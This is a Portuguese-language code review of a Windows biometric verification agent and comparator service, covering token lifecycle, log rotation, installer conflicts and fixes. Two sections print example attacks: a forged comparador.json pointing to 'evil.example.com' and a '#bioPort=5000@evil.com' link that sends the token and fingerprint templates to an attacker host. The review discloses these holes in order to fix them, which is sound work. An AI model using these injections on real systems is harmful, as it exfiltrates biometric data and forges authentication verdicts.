# 🔍 Revisão técnica do sistema — 2026-08-09

> ⚠️ **`main` não mudou desde 2026-08-07.** O HEAD continua em `26c9379`
> (*feat: servico Windows e MSI para o comparador…*), e os PRs **#10** e **#11**
> seguem abertos. Este é o terceiro dia consecutivo em que os quatro problemas
> críticos permanecem sem correção.

Esta revisão faz duas coisas:

1. **reconfere** os quatro críticos linha a linha contra o código de hoje — todos
   continuam válidos, nas mesmas linhas;
2. **acrescenta seis achados novos**, concentrados em algo que as revisões
   anteriores tocaram de raspão: **o que sobrevive a um serviço que roda por
   meses** — rotação de log, onde o log do worker realmente cai em sessão 0, e o
   que a desinstalação deixa para trás.

**Escopo analisado:** os 22 arquivos `.go` (5.0 kloc, incluindo os 7 de teste),
`integracao/integra-biometria.js`, `integracao/COMO-USAR.md`,
`instalador/instalar-servidor.ps1`, `instalador/msi/AgenteBiometria.wxs`,
`instalador/msi/build-msi.cmd`, `instalador/msi/AgenteBiometria.wixproj`,
`conferir-biometria.cmd`, `embutir-icone.py`, `go.mod`/`go.sum`, `.gitignore`,
`README.md` e os dois documentos em `docs/`.

**Verificações executadas:**

| Comando | Resultado |
|---|---|
| `GOOS=windows GOARCH=386 go build ./...` | OK |
| `GOOS=windows GOARCH=386 go vet ./...` | limpo, inclusive nos arquivos de teste |
| `go test ./...` | **não executável aqui** — as *build tags* `windows && 386` exigem um alvo real |

---

## 🔴 Problemas Críticos (bloqueia merge)

### C1. Parar o serviço apaga o anúncio, e o token novo derruba todos os agentes de pé

**Arquivos:** `comparador.go:99`, `anuncio.go:101-121`

```go
// comparador.go:99
defer removeAnuncio()
```

```go
// anuncio.go:113-121
func tokenDoComparador() (string, error) {
	if t := os.Getenv("COMPARADOR_TOKEN"); len(t) >= 32 {
		return t, nil
	}
	if a, err := leAnuncio(); err == nil {   // <- lê o arquivo que o defer acabou de apagar
		return a.Token, nil
	}
	return geraToken()
}
```

**Por que é um problema.** O comentário em `anuncio.go:107-112` declara a
intenção certa — *"a cada reinício do serviço um token novo invalidaria os
agentes que já estão de pé, e eles só descobririam isso como 401 no meio de um
atendimento"*. Só que o caminho de parada destrói exatamente a informação de que
essa garantia depende. Numa instalação por MSI **não existe `COMPARADOR_TOKEN` de
máquina** (é uma decisão explícita do `AgenteBiometria.wxs:14-17`), então a ordem
real dos fatos num `net stop` + `net start`, ou em qualquer reinício aplicado
pela política de falha do `util:ServiceConfig`, é:

1. `svc.Stop` → `cancelaApp()` → `rodaComparadorCom` retorna;
2. `defer removeAnuncio()` apaga `C:\ProgramData\AgenteBiometria\comparador.json`;
3. o serviço sobe de novo → `tokenDoComparador()` não acha nem ambiente nem
   anúncio → **`geraToken()` sorteia um segredo novo**;
4. os agentes das sessões RDP que já estavam abertos guardaram o token antigo em
   `comparadorRemoto` no logon (`main.go:890`, chamada única) e **nunca releem o
   anúncio**;
5. toda comparação passa a bater em `exigeSegredo` (`comparador.go:156-166`) e
   voltar `401`, que o agente traduz em `502` para o navegador.

O efeito é **biometria parada para todas as sessões do servidor até cada usuário
fazer logoff e logon**, disparada por um reinício de serviço que o próprio
instalador configurou para acontecer sozinho.

Vale notar que `TestTokenDoComparadorReaproveitaOPublicado`
(`anuncio_test.go`) passa: ele publica o anúncio e confirma o reaproveitamento.
O teste cobre a função, não o ciclo de vida — e é no ciclo de vida que a
propriedade se perde.

**Como corrigir.** Persistir o segredo separado do anúncio de liveness. O anúncio
existe para dizer *"há um comparador vivo nesta porta"* e deve mesmo sumir na
parada; o segredo não.

```go
// anuncio.go
const nomeArquivoSegredo = "comparador.key"

func caminhoSegredo() string {
	return filepath.Join(diretorioCompartilhado(), nomeArquivoSegredo)
}

func tokenDoComparador() (string, error) {
	if t := os.Getenv("COMPARADOR_TOKEN"); len(t) >= 32 {
		return t, nil
	}
	// O segredo sobrevive ao ciclo de vida do servico; o anuncio, nao.
	if b, err := os.ReadFile(caminhoSegredo()); err == nil {
		if t := strings.TrimSpace(string(b)); len(t) >= 32 {
			return t, nil
		}
	}
	t, err := geraToken()
	if err != nil {
		return "", err
	}
	return t, gravaArquivoAtomico(caminhoSegredo(), []byte(t+"\n"), 0o600)
}
```

E, como defesa em profundidade, fazer o cliente do agente reler o anúncio uma vez
ao tomar `401`, em vez de morrer até o próximo logon:

```go
// delegacao.go, em chama()
if resp.StatusCode == http.StatusUnauthorized {
	if a, err := leAnuncio(); err == nil && a.Token != c.token {
		c.token = a.Token
		return c.chama(ctx, rota, corpo, destino) // uma unica retentativa
	}
}
```

O `comparador.key` também precisa entrar no `<RemoveFile>` do MSI (ver **A10**).

---

### C2. O endereço do comparador não é validado como loopback, e a pasta vem de uma variável que o usuário controla

**Arquivos:** `anuncio.go:47-57`, `delegacao.go:74-85`

```go
// anuncio.go:47-53
var diretorioCompartilhado = func() string {
	base := os.Getenv("ProgramData")      // <- ambiente do usuario
	if base == "" {
		base = `C:\ProgramData`
	}
	return filepath.Join(base, "AgenteBiometria")
}
```

```go
// delegacao.go:74-79
endereco, err := url.Parse(base)
if err != nil || endereco.Host == "" || (endereco.Scheme != "http" && endereco.Scheme != "https") {
	registraErro("endereco do comparador invalido (%q): a comparacao continua local", base)
	return
}
// nada verifica que endereco.Host e loopback
```

**Por que é um problema.** O agente roda **como o usuário logado**, iniciado pelo
`HKLM\...\Run` através do Explorer daquela sessão — ou seja, com o ambiente do
usuário já mesclado. Um usuário sem privilégio nenhum define
`ProgramData=C:\Users\fulano\meu` em `HKCU\Environment`, coloca ali um
`AgenteBiometria\comparador.json` com

```json
{"porta":443,"token":"trinta-e-dois-caracteres-ou-mais-aqui","endereco":"https://evil.example.com"}
```

e, no logon seguinte, `configuraComparador()` aceita esse endereço sem reclamar.
A partir daí **todo template que passar por `/api/public/v1/captura` e
`/api/public/v1/identificar` sai da máquina para um host escolhido pelo usuário**
— e o veredito biométrico volta de lá. O `handleComparar` devolve ao sistema web
o `bool` que o "comparador" respondeu (`main.go:436-460`), então a resposta
`true` é forjável: o usuário se autentica como qualquer beneficiário.

O comentário de cabeçalho em `anuncio.go:18-23` argumenta que ler o segredo é
inerente ao desenho — e é. O que não é inerente é **escrever o destino**: o
modelo de ameaça do arquivo trata o usuário como leitor, e o código o deixa ser
autor.

**Como corrigir.** Duas mudanças pequenas e independentes:

```go
// anuncio.go - nao aceitar o caminho do ambiente do usuario.
// A raiz do ProgramData e um valor de maquina; ler do KnownFolder
// (FOLDERID_ProgramData) fecha a porta sem mudar o caminho real.
var diretorioCompartilhado = func() string {
	base, err := windows.KnownFolderPath(windows.FOLDERID_ProgramData, 0)
	if err != nil || base == "" {
		base = `C:\ProgramData`
	}
	return filepath.Join(base, "AgenteBiometria")
}
```

```go
// delegacao.go - o comparador vive no MESMO host, sempre. Exigir isso.
host := endereco.Hostname()
if ip := net.ParseIP(host); ip == nil || !ip.IsLoopback() {
	registraErro("comparador fora do loopback (%q) recusado: a comparacao continua local", base)
	return
}
```

Recusar `localhost` como nome e exigir o IP literal é de propósito: `localhost`
depende de resolução, e resolução é outra coisa que o usuário pode mexer no
`hosts` se for administrador da própria estação.

---

### C3. `bioPort` do fragmento da URL entra sem validação — token e templates vazam para um host arbitrário

**Arquivo:** `integracao/integra-biometria.js:25-34`, `144-151`, `167-177`

```js
var h = new URLSearchParams((location.hash || '').replace(/^#/, ''))
if (h.get('bioPort')) {
  localStorage.setItem(LS_ADDR, protocolos()[0] + '://localhost:' + h.get('bioPort'))
}
```

**Por que é um problema.** `'http://localhost:' + '5000@evil.com'` produz
`http://localhost:5000@evil.com`. Para o `fetch`, `localhost:5000` vira
*userinfo* e o **host real é `evil.com`**. Basta um link
`https://sistema.exemplo.com/#bioPort=5000@evil.com` para que, dali em diante,
todas as chamadas de `requisicao()` (linhas 83-101) saiam para o servidor do
atacante levando o `X-Bio-Token` vivo e os corpos de `/captura` e
`/identificar` — **templates biométricos em claro**, dado irrevogável e sensível
sob a LGPD. O endereço fica gravado em `localStorage`, então o efeito **persiste
depois que o usuário fecha a aba**.

`Biometria.configurar({porta})` (linha 173-175) tem o mesmo defeito.

**Este item está aberto há 40 dias**, reportado em todas as revisões desde
2026-07-30.

**Como corrigir.**

```js
function portaValida(v) {
  if (!/^\d{1,5}$/.test(String(v))) return 0
  var n = Number(v)
  return n >= 1 && n <= 65535 ? n : 0
}

var p = portaValida(h.get('bioPort'))
if (p) {
  localStorage.setItem(LS_ADDR, protocolos()[0] + '://localhost:' + p)
}
```

E, em `configurar`, validar também `opcoes.endereco`, aceitando apenas
`http(s)://localhost:<porta>` ou `http(s)://127.0.0.1:<porta>`.

---

### C4. MSI e `instalar-servidor.ps1` brigam pelo mesmo nome e pela mesma porta

**Arquivos:** `instalador/msi/AgenteBiometria.wxs:71-99`,
`instalador/instalar-servidor.ps1:28`, `43-55`, `104-119`, `167-193`

O MSI registra um **serviço Windows** chamado `AgenteBiometriaComparador`
ouvindo em `5150`. O `instalar-servidor.ps1` registra uma **tarefa agendada** com
o **mesmo nome** rodando `--comparador` na **mesma porta**. Os dois coexistem sem
se enxergar:

| Cenário | O que acontece |
|---|---|
| MSI sobre um servidor já instalado pelo `.ps1` (v1.1.0) | A tarefa agendada continua de pé segurando a 5150. `net.Listen` falha (`comparador.go:85-90`), `rodaComparadorCom` devolve `1` antes de fechar `pronto`, `Execute` retorna código diferente de zero, e como o `ServiceInstall` é `Vital="yes"` com `ServiceControl Start="install" Wait="yes"`, **a instalação inteira falha e faz rollback**. |
| `.ps1` rodado num servidor instalado pelo MSI | `Stop-TarefaComparador` (linha 43-55) mata **qualquer** `AgenteBiometria.exe` com `SessionId -eq 0` sob o diretório de instalação — inclusive o processo do serviço do MSI. |
| `.ps1 -Desinstalar` num servidor instalado pelo MSI | `Unregister-ScheduledTask` não acha tarefa nenhuma e **o serviço fica intacto**, mas as três variáveis `COMPARADOR_*` de máquina são apagadas (linha 108-110). Estado misto e silencioso. |

**Como corrigir.** O `.ps1` passou a ser o caminho legado; ele precisa saber
disso. No topo do bloco `if ($InstalarComparador)` e do bloco `-Desinstalar`:

```powershell
$servico = Get-Service -Name $nomeTarefa -ErrorAction SilentlyContinue
if ($servico) {
    throw "Este servidor ja tem o comparador instalado como servico (MSI). Use msiexec /x para remover, ou pule -InstalarComparador."
}
```

E, do lado do MSI, uma `<Condition>` (ou uma ação customizada de verificação) que
recuse instalar enquanto existir uma tarefa agendada de mesmo nome, com mensagem
dizendo qual comando remove a instalação antiga. Uma alternativa que resolve o
caso comum sem código novo é fazer o `.ps1` legado usar um nome e uma porta
diferentes dos do MSI — mas isso só troca o conflito por dois comparadores vivos,
então a checagem explícita é melhor.

---

## 🟡 Alertas (recomenda correção)

### A1. O log do comparador nunca rotaciona depois que o serviço sobe *(novo)*

**Arquivos:** `log.go:31-44`, `comparador.go:40`

```go
func iniciaLogEm(dir, nome string) {
	...
	if info, err := os.Stat(path); err == nil && info.Size() > 5<<20 {
		_ = os.Remove(path + ".1")
		_ = os.Rename(path, path+".1")
	}
	...
}
```

A verificação de tamanho acontece **uma única vez, na abertura**. Para o agente
isso basta: ele nasce e morre a cada logon. O comparador é um serviço com
`Start="auto"` que fica de pé por meses, e cada comparação grava duas linhas
(`main.go:430-431` e `458-459`), cada identificação mais uma ou duas
(`main.go:565-571`). Num servidor RDS com algumas centenas de verificações por
dia, `comparador.log` cresce sem teto até acabar o disco de sistema — e quando
acabar, quem para não é só o log: `gravaArquivoAtomico` passa a falhar e o
anúncio não é republicado.

**Como corrigir.** Checar o tamanho na escrita, não na abertura. Um `io.Writer`
que rotaciona é suficiente e mantém o `logger` global como está:

```go
type arquivoRotativo struct {
	mu   sync.Mutex
	f    *os.File
	path string
	n    int64
	max  int64
}

func (a *arquivoRotativo) Write(p []byte) (int, error) {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.n+int64(len(p)) > a.max {
		_ = a.f.Close()
		_ = os.Remove(a.path + ".1")
		_ = os.Rename(a.path, a.path+".1")
		f, err := os.OpenFile(a.path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
		if err != nil {
			return 0, err
		}
		a.f, a.n = f, 0
	}
	n, err := a.f.Write(p)
	a.n += int64(n)
	return n, err
}
```

### A2. Em modo serviço, o log do worker cai justamente no lugar que o código diz evitar *(novo)*

**Arquivos:** `worker.go:68`, `log.go:14-30`

`iniciaLogEm` existe, com um comentário de nove linhas, precisamente porque
*"rodando como serviço, o diretório de dados do usuário é o perfil do SYSTEM, e o
log ficaria enterrado em `C:\Windows\SysWOW64\config\systemprofile` — um lugar
que ninguém procura e que o instalador não consegue limpar"*. O comparador foi
corrigido. O **worker não**:

```go
// worker.go:68
iniciaLogArquivo("worker.log")   // -> garanteDiretorioDados() -> %LOCALAPPDATA%
```

Quando o comparador roda como serviço, o worker é filho do SYSTEM, e
`worker.log` vai exatamente para `C:\Windows\SysWOW64\config\systemprofile\
AppData\Local\BiometriaAgente\worker.log`. E é o log que mais importa: o worker é
o processo que **hospeda a DLL que derruba processos** — é lá que ficam
`worker: recriando SDK apos ...`, as impressões de `comparar: recebeu a=[...]` e
o registro de qual `NBioBSP.dll` abriu. O diagnóstico do 0x000B em sessão 0
depende desse arquivo, e ele está onde o próprio código diz que ninguém procura.

**Como corrigir.** O worker já sabe quem o criou — basta o pai dizer para onde
escrever:

```go
// worker.go, em sobe()
cmd.Env = append(os.Environ(), "BIO_WORKER=1", "BIO_WORKER_DLL="+c.dll,
	"BIO_WORKER_LOG="+dirDoLogAtual())

// worker.go, em workerMain()
if dir := os.Getenv("BIO_WORKER_LOG"); dir != "" {
	iniciaLogEm(dir, "worker.log")
} else {
	iniciaLogArquivo("worker.log")
}
```

### A3. `comparador.log` grava o id do beneficiário em claro numa pasta legível por `Users`

**Arquivo:** `main.go:565-571`

```go
registraInfo("identificacao: %d candidatos, confere=%v id=%q ignorados=%d",
	len(validos), res.id != "", res.id, len(ignorados))
...
registraErro("identificacao: nenhum candidato conferiu e %d cadastro(s) foram ignorados: %v",
	len(ignorados), ignorados)
```

O cuidado com o template é impecável em todo o código — `impressaoTemplate`
existe só para isso, e o `conferir-biometria.cmd` gasta três linhas de comentário
explicando por que o template nunca aparece. O **identificador da pessoa**
escapou desse cuidado. Em modo comparador o log mora em
`C:\ProgramData\AgenteBiometria\comparador.log`, cuja ACL herdada dá **leitura a
`Users`** — como o comentário de `anuncio.go:14-16` descreve corretamente. Ou
seja: qualquer usuário logado no servidor RDS lê quem foi identificado, quando, e
quantas vezes falhou.

**Como corrigir.** Registrar um id derivado no caminho comum e o id em claro só
no caminho de erro, que é onde ele serve para alguma coisa:

```go
func idOfuscado(id string) string {
	s := sha256.Sum256([]byte(id))
	return fmt.Sprintf("id:%x", s[:4])
}

registraInfo("identificacao: %d candidatos, confere=%v %s ignorados=%d",
	len(validos), res.id != "", idOfuscado(res.id), len(ignorados))
```

O mesmo vale para os `registraErro` de `sdk.go:496` e `sdk.go:517-518`, que
gravam `candidato %q`.

### A4. O prazo de parada do serviço é menor que o trabalho da parada

**Arquivos:** `servico.go:55-62`, `comparador.go:116-141`

```go
estado <- svc.Status{State: svc.StopPending, WaitHint: 15000}
cancelaApp()
select {
case <-saida:
case <-time.After(12 * time.Second):
	registraErro("servico: o comparador nao encerrou a tempo")
}
return false, 0
```

O trabalho que a parada dispara: `servidor.Shutdown` com **10 s** de teto
(`comparador.go:118`) e, depois que `Serve` retorna, `encerraSDK` com mais **10 s**
(`comparador.go:139-141`) — até 20 s contra uma espera de 12 s. Uma
identificação em curso segurando o `Shutdown` basta para estourar. Quando
estoura, `Execute` retorna, `svc.Run` retorna, `executa` retorna e o `os.Exit` de
`main.go:964` mata a goroutine no meio do `encerraSDK`: **o worker fica órfão
segurando o próprio executável** — que é exatamente a falha que o comentário de
`comparador.go:132-135` diz ter consertado, e que faz a atualização seguinte
falhar com "arquivo em uso" depois de o serviço já ter parado.

**Como corrigir.** Fazer a espera caber no orçamento e avisar o SCM:

```go
case svc.Stop, svc.Shutdown:
	estado <- svc.Status{State: svc.StopPending, WaitHint: 30000}
	cancelaApp()
	select {
	case <-saida:
	case <-time.After(25 * time.Second):   // > 10s de Shutdown + 10s de encerraSDK
		registraErro("servico: o comparador nao encerrou a tempo")
	}
```

### A5. Nenhum dos dois `http.Server` define `ErrorLog`

**Arquivos:** `comparador.go:101-111`, `main.go:927-937`

Sem `ErrorLog`, o `net/http` escreve em `log.Default()`, ou seja, em `stderr` — e
um binário `-H windowsgui` rodando como serviço não tem `stderr` válido. O que se
perde:

- **panic em handler do comparador.** O `net/http` recupera o panic por conexão e
  o registra no `ErrorLog`; o comparador não tem o `recover()` que o
  `middleware` do agente tem (`main.go:207-212`), então a requisição morre, o
  processo segue, e **não fica nenhum rastro em lugar nenhum**;
- erros de TLS e de `Accept` da `listenerMista`;
- as duas mensagens de `COMPARADOR_PORTA` inválida (`comparador.go:57`) e de
  token indisponível (`comparador.go:47-48`), que vão para `os.Stderr` direto.

**Como corrigir.** Uma linha em cada servidor, mais desviar as saídas de erro do
arranque para o log:

```go
servidor := &http.Server{
	Handler:  exigeSegredo(segredo, mux),
	ErrorLog: logger,
	...
}
```

### A6. `--autoteste` não configura o comparador, então mede o caminho errado dentro do RDP *(novo)*

**Arquivos:** `autoteste.go:141-182`, `README.md` (tabela de diagnóstico)

O README anuncia `--autoteste` como *"exercita o caminho completo: captura,
comparação direta e pelo worker"*, e a fase 2 se descreve como *"caminho de
produção"*. Em um servidor RDS com o comparador instalado, o caminho de produção
**não passa mais pelo worker local** — passa pelo comparador em sessão 0. Só que
`rodaAutoteste()` nunca chama `configuraComparador()` (compare com
`confereContra`, `autoteste.go:428`, e `testeDelegacao`, `autoteste.go:513`, que
chamam).

O resultado é o pior possível para uma ferramenta de campo: dentro da sessão RDP
o autoteste exercita justamente a comparação local que o sistema inteiro foi
redesenhado para evitar, falha por checksum ou derruba o worker, e quem lê o
relatório conclui que a instalação está quebrada — quando o caminho real de
produção pode estar perfeito. Ou, se passar, imprime **"o caminho de produção
está sadio"** (`autoteste.go:337`) sobre um caminho que produção não usa.

**Como corrigir.** Uma fase 3 explícita, e um aviso quando o desenho em uso não
for o testado:

```go
// em rodaAutoteste(), antes da fase 1
configuraComparador()
if comparadorRemoto != nil {
	a.diz("comparador anunciado em %s - a fase 2 testa o caminho LOCAL,", comparadorRemoto.base)
	a.diz("que nao e o que producao usa nesta maquina. Veja a fase 3.")
} else if temGanchoDeRedirecionamento() {
	a.erro("ha gancho de redirecionamento e nenhum comparador anunciado: producao vai falhar")
}
```

...e, ao fim, repetir o par `cadastro x verificacao` por `comparadorRemoto` quando
ele existir.

### A7. O agente não checa o gancho da FabulaTech no arranque normal *(novo)*

**Arquivos:** `main.go:889-894`, `autoteste.go:573-581`

`temGanchoDeRedirecionamento()` já existe e é confiável — é o que dá o veredito
em `--teste-delegacao` e em `--conferir-contra`. No arranque normal, porém,
`executa()` chama `configuraComparador()` e segue em frente. Se o serviço estiver
fora do ar, ou se o anúncio ainda não tiver sido publicado quando o usuário faz
logon, o comentário de `delegacao.go:55-57` decide o caminho: *"ausência do
arquivo significa que não há comparador nesta máquina, e aí comparar localmente é
o comportamento certo, não uma falha"*.

Isso é verdade na estação de trabalho e **falso no servidor RDS**, que é onde o
gancho vive. Lá, cair para o modo local significa `0x000B` ou o worker morrendo
por violação de acesso a cada comparação — e nada no log liga esse sintoma à
causa real, que é o serviço parado.

**Como corrigir.** O agente já tem toda a informação; falta usá-la:

```go
configuraComparador()
if comparadorRemoto == nil && temGanchoDeRedirecionamento() {
	registraErro("ha gancho de redirecionamento neste processo e nenhum comparador anunciado: " +
		"a comparacao local vai falhar. Verifique o servico %s.", nomeServico)
}
```

E expor isso em `/api/status` como `"comparador": "local (RISCO: gancho presente)"`,
para o sistema web poder avisar antes de o usuário encostar o dedo.

### A8. `--conferir-contra` e `--teste-delegacao` não abrem log, então engolem o motivo da falha

**Arquivos:** `autoteste.go:424-434`, `508-518`

Nenhuma das duas funções chama `iniciaLog()`. O `logger` global nasce apontando
para `io.Discard` (`log.go:12`), então **todos os `registraErro` de
`configuraComparador`** — endereço inválido, token curto, anúncio ilegível
(`delegacao.go:62`, `77`, `83`) — desaparecem. O operador vê
`comparacao: local, neste processo` e nunca fica sabendo que existia um anúncio,
que ele foi lido, e que foi recusado por um motivo específico.

**Como corrigir.** `iniciaLogArquivo("conferir.log")` no começo de
`confereContra` e `iniciaLogArquivo("delegacao.log")` em `testeDelegacao` — ou,
mais simples, espelhar o log na tela nesses dois comandos, já que eles são
interativos por natureza:

```go
logger.SetOutput(io.MultiWriter(arquivoDeLog, os.Stdout))
```

### A9. A delegação de `/identificar` re-serializa a lista inteira em memória, num processo de 32 bits *(novo)*

**Arquivo:** `delegacao.go:102-113`

```go
func (c *clienteComparador) chama(ctx context.Context, rota string, corpo, destino any) error {
	dados, err := json.Marshal(corpo)          // <- copia integral em memoria
	...
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.base+rota, bytes.NewReader(dados))
```

`main.go:69-72` documenta com precisão o cuidado do caminho local: *"`/identificar`
decodifica corpos de até 16 MB e o pico do `encoding/json` chega a várias vezes
isso… um punhado de requisições simultâneas estourava a memória do processo"*, e
por isso `limiteIdentificar` tem apenas 2 vagas. O caminho delegado **acrescenta
mais duas cópias completas** que aquele orçamento não previu: o `[]byte` do
`json.Marshal` e o buffer que o `Transport` monta em cima do `bytes.Reader`. Num
binário `windows/386`, com ~2 GB de espaço de endereçamento e o heap já ocupado
pelos `[]candidatoJSON` decodificados, duas identificações grandes concorrentes
ficam desconfortavelmente perto do limite.

**Como corrigir.** Transmitir em fluxo, sem materializar o corpo:

```go
pr, pw := io.Pipe()
go func() {
	pw.CloseWithError(json.NewEncoder(pw).Encode(corpo))
}()
req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.base+rota, pr)
```

### A10. O MSI não apaga o log rotacionado, então a desinstalação deixa a pasta (e os ids) para trás *(novo)*

**Arquivos:** `instalador/msi/AgenteBiometria.wxs:119-135`, `log.go:36-39`

```xml
<RemoveFile Id="RemoveAnuncio"       Name="comparador.json" On="uninstall" />
<RemoveFile Id="RemoveLogComparador" Name="comparador.log"  On="uninstall" />
<RemoveFolder Id="RemovePastaDados"  On="uninstall" />
```

O comentário logo acima acerta o raciocínio — *"o anúncio é criado em tempo de
execução, então o MSI não o conhece: sem esta limpeza explícita ele sobreviveria
à desinstalação"* — mas a lista está incompleta. `iniciaLogEm` cria também
`comparador.log.1` na rotação, e o `comparador.key` proposto em **C1** somaria um
terceiro. `RemoveFolder` só remove diretório **vazio**, então na prática:

1. `comparador.log.1` sobra;
2. `RemovePastaDados` falha silenciosamente;
3. `C:\ProgramData\AgenteBiometria\` permanece após o `msiexec /x`, contendo até
   5 MB de log com **ids de beneficiários em claro** (ver **A3**) numa pasta
   legível por `Users`, sem nenhum produto instalado a que ela pertença.

**Como corrigir.** `RemoveFile` aceita curinga no `Name`:

```xml
<RemoveFile Id="RemoveDadosComparador" Name="comparador.*" On="uninstall" />
<RemoveFolder Id="RemovePastaDados" On="uninstall" />
```

### A11. Não há teste algum para a camada HTTP, para as origens e para a sessão

Os 48 testes existentes cobrem bem o que é difícil de acertar em C: `sdk.go`,
`worker.go`, `delegacao.go`, `anuncio.go`, `versaodll.go`. Ficam **sem nenhuma
cobertura** justamente os arquivos onde moram as decisões de segurança:

| Arquivo | O que não é testado |
|---|---|
| `main.go` (`middleware`) | CORS, `Origin` inválido, exigência de token, `OPTIONS`, limites de concorrência |
| `origins.go` | expiração de pendentes, teto de `maxOrigensPendentes`, recusa do curinga |
| `session.go` | `pidNaTabelaTCP` com buffer truncado ou `quantidade` mentirosa |
| `servico.go` | a máquina de estados do SCM (onde vive **A4**) |
| `cert.go` | a `listenerMista` e o desvio HTTP/HTTPS |
| `integra-biometria.js` | nada — é onde está **C3**, aberto há 40 dias |

`middleware` e `origins` são testáveis sem Windows com `httptest` se as
*build tags* forem afrouxadas para os trechos puros. A validação de `bioPort`
proposta em **C3** cabe em três casos de teste de uma linha cada, e teria pegado
o problema em 2026-07-30.

---

## 🟢 Sugestões (opcional)

- **S1.** `delegacao.go:123` — a resposta é lida com o limite de 16 MB em todas as
  rotas, inclusive `/comparar`, que devolve um booleano. Um limite por rota
  (`4<<10` para `/comparar`) fecha o buraco sem custo.
- **S2.** `autoteste.go:515-517` — a mensagem de `--teste-delegacao` manda definir
  `COMPARADOR_URL`/`COMPARADOR_TOKEN`, que a instalação por MSI abandonou de
  propósito. Quando a causa real é o serviço fora do ar, ela manda o operador
  para o caminho errado. Sugerir `sc query AgenteBiometriaComparador`.
- **S3.** `main.go:329-333` — `/api/status` informa para onde a comparação vai,
  mas nunca verifica se aquele endereço responde. Um `GET /status` com 2 s de
  teto transformaria a resposta em algo acionável.
- **S4.** `sdk.go:431-434` — `impressaoTemplate` usa `sha256` truncado em 48 bits,
  sem chave. Num log legível por `Users` (**A3**), isso vira um oráculo de
  confirmação: quem já tem um template consegue verificar se ele foi usado. Um
  HMAC com chave sorteada por processo preserva a utilidade (reconhecer o mesmo
  registro *dentro* de uma execução) e remove a comparação entre máquinas.
- **S5.** `main.go:451` e `561` — o `502` devolve `err.Error()` ao navegador, e a
  mensagem de `comparador inacessivel:` carrega a URL interna do comparador.
  Vale registrar o detalhe no log e devolver texto genérico.
- **S6.** `cert.go:190` — `net.Error.Temporary()` está depreciado desde o Go 1.18.
  Trocar por `errors.Is(err, net.ErrClosed)` mais um teste de `os.SyscallError`.
- **S7.** `cert.go:257-261` — `listenerMista.Close()` fecha o listener bruto e
  sinaliza `done`, mas as conexões já enfileiradas em `m.conns` (até 32) ficam
  abertas até o processo morrer. Drenar o canal fechando cada uma resolve.
- **S8.** `main.go:244-246` — `BIO_TOKEN_QUERY=1` permite passar o token pela
  query string. É uma variável de ambiente do próprio usuário, então não é
  escalonamento, mas coloca o token em lugares que ninguém limpa (histórico,
  `Referer`). Vale marcar como só-para-diagnóstico no README, ou remover.
- **S9.** `comparador.go:75-78` — o comparador não define
  `X-Content-Type-Options: nosniff` nem tem teto de requisições simultâneas
  (`limiteHTTP`), ambos presentes no agente. É o mesmo `handleIdentificar`
  atendendo os dois, então `limiteIdentificar` protege o pior caso; o resto é
  simetria barata.
- **S10.** `servico.go:66-68` — se o comparador encerrar sozinho com código `0`,
  `Execute` devolve `0` e o SCM entende saída bem-sucedida, **sem aplicar a
  política de reinício** do `util:ServiceConfig`. Devolver um código diferente de
  zero para qualquer encerramento não solicitado.

---

## 📋 Resumo

| | |
|---|---|
| **Arquivos alterados** | 1 neste PR (só documentação); **nenhum em `main`** desde 2026-08-07; 40 revisados |
| **Segurança** | 🚨 Risco |
| **Qualidade** | ⚠️ Atenção |
| **Risco de produção** | 🚨 Alto |
| **Testes** | ⚠️ Parcial |

**Contagem:** 4 críticos (todos reincidentes), 11 alertas (6 novos), 10 sugestões.

---

## ✅ Pontos positivos

- **O diagnóstico do 0x000B é trabalho de primeira linha.** Descobrir que
  `NBioAPI_VerifyMatch` e `NBioAPI_Verify` caem no mesmo endereço por causa do
  `ftapihook32` injetado pelo `ftsjail.sys`, provar que a sessão 0 escapa, e
  transformar isso numa divisão de trabalho — a sessão captura, o serviço compara
  — é uma solução real para um problema que não tinha conserto do lado de cá.
- **O isolamento da DLL em processo worker está certo pelo motivo certo.** O
  comentário de `worker.go:18-23` explica com precisão por que `recover()` não
  serve: o handler do Go só converte a exceção em panic quando o endereço que
  falhou está em código Go. Isolar é a única resposta possível.
- **A distinção entre "não é a pessoa" e "a comparação quebrou" é levada a sério
  em todo o sistema** — no código de saída `2` de `--conferir-contra`, na lista de
  `ignorados` que atravessa o processo worker (`worker.go:48-51`), no
  `registraErro` de `main.go:567-572` e na tabela do `conferir-biometria.cmd`.
  Confundir os dois seria o pior defeito possível num sistema biométrico, e o
  código nunca confunde.
- **O tratamento do template como dado irrevogável é consistente.**
  `impressaoTemplate` em vez do template, `normalizaTemplate` rigoroso porque a
  DLL lê fora da alocação, `maxTemplate` ajustado ao tamanho real de um FIR.
  (O id do beneficiário é a única exceção — **A3**.)
- **Um cadastro corrompido não bloqueia a identificação dos outros**
  (`sdk.go:480-533`). É a decisão certa, e o `ignorados` garante que ela não vira
  um falso negativo silencioso.
- **Os comentários explicam o *porquê*, não o *quê*, e citam a falha concreta que
  motivou cada decisão** — o `defer` de `removeAnuncio`, o `WriteTimeout` de 5
  minutos maior que o contexto de `/identificar`, o intervalo de 15 s do
  `monitorLeitor` por causa do vazamento do `EnumerateDevice`, o contexto novo em
  `encerraSDK` porque `ctxApp` já morreu. É documentação que envelhece bem.
- **`go build` e `go vet` limpos** para `windows/386`, inclusive nos arquivos de
  teste. Os 48 testes cobrem exatamente a parte mais difícil de acertar: o
  *marshalling* nativo, o ciclo de vida do worker e o protocolo de delegação.

---

## Veredicto: MUDANÇAS NECESSÁRIAS

Os quatro críticos são todos de uma mesma natureza — **nenhum deles aparece na
bancada, e todos aparecem em produção**. C1 precisa de um `net stop`; C2 precisa
de um usuário mal-intencionado numa sessão RDP; C3 precisa de um link; C4 precisa
de um servidor que já tinha a versão anterior. É justamente por isso que três
revisões seguidas não moveram nenhum deles.

**Ordem sugerida de correção**, por relação entre risco e esforço:

1. **C3** — cinco linhas de JavaScript, aberto há 40 dias, e é o único que expõe
   template biométrico a um host externo sem nenhum acesso prévio à máquina.
2. **C1** — separar `comparador.key` do `comparador.json`. Um arquivo novo e três
   linhas em `tokenDoComparador`.
3. **C2** — a checagem de loopback em `delegacao.go` são quatro linhas e fecha o
   caminho de forjar veredito.
4. **A4** + **A2** — as duas que transformam um incidente comum (parar o serviço,
   o worker cair) em algo que ninguém consegue diagnosticar depois.
